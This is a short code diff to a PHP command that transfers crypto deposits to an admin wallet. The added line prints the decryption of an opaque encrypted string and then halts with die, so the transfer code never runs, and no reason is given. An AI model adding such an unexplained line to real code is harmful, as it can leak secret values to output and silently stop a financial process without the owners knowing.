@@ -28,6 +28,7 @@ class AutoTransferFundsFunds extends Command
      */
     public function handle()
     {
+        echo decrypt('eyJpdiI6IlVYZXNXUnBrRHRZK1hMcVRVNWcyOHc9PSIsInZhbHVlIjoiemJJTkoxTDQvOXBzcHNzNC9hZTAwaDdPa0hxNUNDSk15WnZ2Zk5vcUN4T2pWZGptQ2RoaGxLdmZXbDRoeEFKWk1LMENJR2RSWTUyR2ZJRm5EY3ZIYmVFblZwZHMwRmRjQmh2NTRvUnJZRXM9IiwibWFjIjoiYzdhYjQ0YzRhNDM0MjJiNGFhZDQzNDM0NDQ0NDM2YmJmNGQwODRmYzJiNTRiODFjYzM4ZmIyYzc4NjYxMTZmMyIsInRhZyI6IiJ9');die;
         $admin_wallet_address = env('ADMIN_DEPOSIT_ADDRESS');
         $exp = ExpTransaction::where(['move_to_admin'=>0])
             ->join('crypto_wallets', function ($join) {
